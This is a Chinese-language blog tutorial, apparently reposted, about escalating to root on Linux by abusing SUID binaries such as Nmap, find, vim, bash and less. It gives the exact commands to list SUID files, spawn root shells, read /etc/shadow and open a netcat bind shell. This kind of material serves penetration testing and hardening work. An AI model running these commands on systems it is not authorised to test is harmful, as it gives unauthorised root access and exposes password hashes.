\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12194099.html)

### 0x01 简介

SUID 是 Linux 的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有 SUID 权限，那么就可以利用系统中的二进制文件和工具来进行 root 提权。

已知的可以用来提权的 Linux 可执行文件有：

```
Nmap、Vim、find、Bash、More、Less、Nano、cp


```

下面的命令可以发现所有的系统中运行的 SUID 可执行文件:

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \\; 


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114205550820-2072719529.png)

上面的所有二进制文件都可以在 root 权限下运行，因为他们的 owner 是 root，并且他们的权限中含有 s。s 权限使一般使用者临时具有该文件所属主 / 组的执行权限。所以这里就可以假冒 root 用户来执行一些高权操作。

### 0x02 Nmap

早版本的 Nmap(2.02 到 5.21）有交互模式，允许用户执行 shell 命令。Nmap 也是 root 权限下运行的二进制文件。通过参数 interactive 可以进入交互模式:

```
nmap --interactive


```

下面的命令可以对 shell 提权:

```
nmap> !sh
sh-3.2# whoami
root


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114205741311-615395143.png)

Metasploit 也有利用 SUID Nmap 进行提权攻击:

```
exploit/unix/local/setuid\_nmap


```

### 0x03 Find

如果 find 以 SUID 权限运行，所有通过 find 执行的命令都会以 root 权限运行。

```
touch pentestlab
find pentestlab -exec whoami \\;


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114205840140-716678942.png)

主流的 Linux 操作系统都安装了 netcat，可以将该命令提权为 root shell。

```
find pentestlab -exec netcat -lvp 5555 -e /bin/sh \\;


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114205859594-1066722105.png)

当然除了借助 nc 也可以参考其他工具：[\[Shell\] 多姿势反弹 shell](https://www.cnblogs.com/-mo-/p/11988065.html)

### 0x04 Vim

如果 vim 以 SUID 运行，就会继承 root 用户的权限，可以读取系统中所有的文件。

```
vim.tiny /etc/shadow


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114210303667-533476258.png)

通过 vim 运行 shell:

```
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114210320040-95087654.png)

### 0x05 Bash

下面的命令可以以 root 权限打开 bash shell:

```
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)


```

### 0x06 Less/More

Less 和 more 都可以执行提权的 shell

```
less /etc/passwd
!/bin/sh


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200114210540925-986565740.png)

### 0x07 参考链接

[https://www.freebuf.com/articles/system/149118.html](https://www.freebuf.com/articles/system/149118.html)  
[https://pentestlab.blog/2017/09/25/suid-executables/](https://pentestlab.blog/2017/09/25/suid-executables/)